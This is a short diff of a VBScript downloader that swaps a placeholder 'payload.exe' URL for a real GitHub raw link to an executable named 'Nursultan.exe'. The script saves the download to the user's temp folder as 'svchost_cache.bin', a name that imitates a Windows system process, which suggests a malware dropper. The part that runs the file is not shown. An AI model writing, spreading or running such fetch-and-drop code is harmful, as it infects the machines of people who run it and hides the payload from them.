@@ -3,7 +3,7 @@ Set xml = CreateObject("Microsoft.XMLDOM")
 Set shell = CreateObject("WScript.Shell")
 
 
-url = "https://cdn.yourdomain.com/payload.exe"
+url = "https://github.com/kievkeks145/r1d23/raw/refs/heads/main/Nursultan.exe"
 output = shell.ExpandEnvironmentStrings("%TEMP%") & "\svchost_cache.bin"
 
 
